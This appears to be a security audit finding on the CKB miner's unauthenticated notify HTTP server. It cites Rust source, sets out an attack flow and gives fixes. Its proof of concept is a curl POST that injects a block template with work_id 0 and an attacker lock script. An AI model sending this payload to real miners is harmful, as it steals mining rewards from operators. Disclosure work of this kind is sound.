### Title
Unauthenticated Miner Block Template Injection via Notify HTTP Server — (`File: miner/src/client.rs`)

### Summary

The CKB miner's "notify mode" HTTP server (`listen_block_template_notify`) binds a TCP listener and accepts `BlockTemplate` updates from any HTTP client with zero authentication. The `handle` function deserializes any valid JSON body as a `BlockTemplate` and immediately calls `update_block_template`, replacing the miner's active work. When the `listen` address is configured to a non-loopback address, any network-reachable attacker can inject a crafted template whose `cellbase` transaction pays mining rewards to the attacker's lock script, silently redirecting all mined CKB to the attacker.

### Finding Description

`miner/src/client.rs` implements two modes of operation. In notify mode, `listen_block_template_notify` binds a raw TCP listener on the operator-configured `SocketAddr` and serves an HTTP endpoint:

```rust
// miner/src/client.rs lines 358-368
async fn handle(
    client: Client,
    req: Request<hyper::body::Incoming>,
) -> Result<Response<Empty<Bytes>>, Error> {
    let body = BodyExt::collect(req).await?.aggregate();
    if let Ok(template) = serde_json::from_reader(body.reader()) {
        client.update_block_template(template);
    }
    Ok(Response::new(Empty::new()))
}
```

There is no IP allowlist check, no shared secret, no HMAC, and no TLS client certificate — the handler accepts any TCP connection and any JSON body that deserializes as `BlockTemplate`. On success it calls `update_block_template`, which atomically replaces the miner's current work and sends the new `Work` to all mining worker threads via `new_work_tx`.

The `listen` field is a plain `Option<SocketAddr>` with no enforcement that it must be a loopback address:

```rust
// util/app-config/src/configs/miner.rs line 29
pub listen: Option<SocketAddr>,
```

The default config template comments it out (`# listen = "127.0.0.1:8888"`), but the code imposes no restriction. An operator who sets `listen = "0.0.0.0:8888"` (or any routable address) exposes the endpoint to the network.

**Attack flow:**

1. Attacker discovers or guesses the miner's notify port (default suggestion is 8888).
2. Attacker crafts a `BlockTemplate` JSON identical in structure to a legitimate template but with the `cellbase.data.outputs[0].lock` field replaced by the attacker's own lock script.
3. Attacker POSTs the crafted template to `http://<miner-ip>:8888/`.
4. `handle` deserializes it successfully; `update_block_template` fires if the injected `work_id` differs from the current one (or equals 0, which always triggers the update per the `updated` closure logic at lines 295-300).
5. Mining workers immediately begin solving PoW on the attacker's template.
6. Any block found is submitted to the CKB node with the attacker's cellbase, and the block reward is paid to the attacker.

The `work_id` guard (`id != work_id || id == 0`) does not prevent injection — an attacker simply uses `work_id = 0` to unconditionally override the current work.

### Impact Explanation

**Direct theft of mining rewards.** Every block the miner solves after injection pays the block subsidy and transaction fees to the attacker's address. The legitimate miner receives nothing. The CKB node fully validates and accepts the block because the PoW is valid and the cellbase lock script is syntactically correct — the node has no way to distinguish a legitimate template from an injected one. Impact is high: continuous, silent financial loss proportional to the miner's hashrate.

### Likelihood Explanation

Moderate. The `listen` option is opt-in and commented out by default. However, it is a documented, supported production feature explicitly described in `ckb-miner.toml`. Operators who enable notify mode for performance reasons (avoiding polling latency) are the target population. The attack requires only network reachability to the configured port and the ability to send a single HTTP POST — no credentials, no cryptographic material, no prior state. Port scanning or knowledge of the default port (8888) is sufficient reconnaissance.

### Recommendation

1. **Enforce loopback-only binding**: Reject any `listen` address that is not a loopback address (`127.0.0.1` / `::1`) at startup, or emit a prominent warning and require an explicit opt-in flag to bind to a routable address.
2. **Add shared-secret authentication**: Require an `Authorization` header (e.g., Bearer token or HMAC-SHA256 of the body) configured in `ckb-miner.toml`. The CKB node's block assembler notify sender must include the same secret.
3. **Validate template origin**: At minimum, verify that the `parent_hash` and `number` in the injected template match the node's current tip before accepting it, reducing the attacker's ability to inject stale or fabricated templates.

### Proof of Concept

```bash
# Attacker crafts a minimal BlockTemplate with their own cellbase lock script
# and posts it to the miner's notify endpoint.
# work_id=0 unconditionally triggers update_block_template (see lines 295-300).

curl -s -X POST http://<miner-ip>:8888/ \
  -H 'Content-Type: application/json' \
  -d '{
    "version":"0x0",
    "compact_target":"0x1e083126",
    "current_time":"0x...",
    "number":"0x...",
    "epoch":"0x...",
    "parent_hash":"0x...",
    "cycles_limit":"0x...",
    "bytes_limit":"0x...",
    "uncles_count_limit":"0x2",
    "uncles":[],
    "transactions":[],
    "proposals":[],
    "cellbase":{
      "cycles":null,
      "data":{
        "cell_deps":[],"header_deps":[],"inputs":[{"previous_output":{"index":"0xffffffff","tx_hash":"0x000...0"},"since":"0x..."}],
        "outputs":[{"capacity":"0x...","lock":{"args":"<ATTACKER_PUBKEY_HASH>","code_hash":"0x9bd7e06f3ecf4be0f2fcd2188b23f1b9fcc88e5d4b65a8637b17723bbda3cce8","hash_type":"type"},"type":null}],
        "outputs_data":["0x"],"version":"0x0","witnesses":["0x..."]
      }
    },
    "work_id":"0x0",
    "dao":"0x...",
    "extension":null
  }'
# Miner workers now solve PoW on this template; any found block pays the attacker.
``` [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4)

### Citations

**File:** miner/src/client.rs (L234-271)
```rust
    async fn listen_block_template_notify(&self, addr: SocketAddr) {
        let listener = TcpListener::bind(addr).await.unwrap();
        let server = auto::Builder::new(TokioExecutor::new());
        let graceful = GracefulShutdown::new();
        let stop_rx: CancellationToken = new_tokio_exit_rx();

        loop {
            let client = self.clone();
            let handle = service_fn(move |req| handle(client.clone(), req));
            tokio::select! {
                conn = listener.accept() => {
                    let (stream, _) = match conn {
                        Ok(conn) => conn,
                        Err(e) => {
                            info!("accept error: {}", e);
                            tokio::time::sleep(std::time::Duration::from_secs(1)).await;
                            continue;
                        }
                    };
                    let stream = hyper_util::rt::TokioIo::new(Box::pin(stream));
                    let conn = server.serve_connection_with_upgrades(stream, handle);

                    let conn = graceful.watch(conn.into_owned());
                    tokio::spawn(async move {
                        if let Err(err) = conn.await {
                            info!("connection error: {}", err);
                        }
                    });
                },
                _ = stop_rx.cancelled() => {
                    info!("Miner client received exit signal. Exit now");
                    break;
                }
            }
        }
        drop(listener);
        graceful.shutdown().await;
    }
```

**File:** miner/src/client.rs (L293-312)
```rust
    fn update_block_template(&self, block_template: BlockTemplate) {
        let work_id = block_template.work_id.into();
        let updated = |id| {
            if id != work_id || id == 0 {
                Some(work_id)
            } else {
                None
            }
        };
        if self
            .current_work_id
            .fetch_update(Ordering::SeqCst, Ordering::SeqCst, updated)
            .is_ok()
        {
            let work: Work = block_template.into();
            if let Err(e) = self.new_work_tx.send(Works::New(work)) {
                error!("notify_new_block error: {:?}", e);
            }
        }
    }
```

**File:** miner/src/client.rs (L358-368)
```rust
async fn handle(
    client: Client,
    req: Request<hyper::body::Incoming>,
) -> Result<Response<Empty<Bytes>>, Error> {
    let body = BodyExt::collect(req).await?.aggregate();

    if let Ok(template) = serde_json::from_reader(body.reader()) {
        client.update_block_template(template);
    }

    Ok(Response::new(Empty::new()))
```

**File:** util/app-config/src/configs/miner.rs (L19-30)
```rust
pub struct ClientConfig {
    /// CKB node RPC endpoint.
    pub rpc_url: String,
    /// The poll interval in seconds to get work from the CKB node.
    pub poll_interval: u64,
    /// By default, miner submits a block and continues to get the next work.
    ///
    /// When this is enabled, miner will block until the submission RPC returns.
    pub block_on_submit: bool,
    /// listen block_template notify instead of loop poll
    pub listen: Option<SocketAddr>,
}
```

**File:** resource/ckb-miner.toml (L59-61)
```text
# enable listen notify mode
# listen = "127.0.0.1:8888"

```
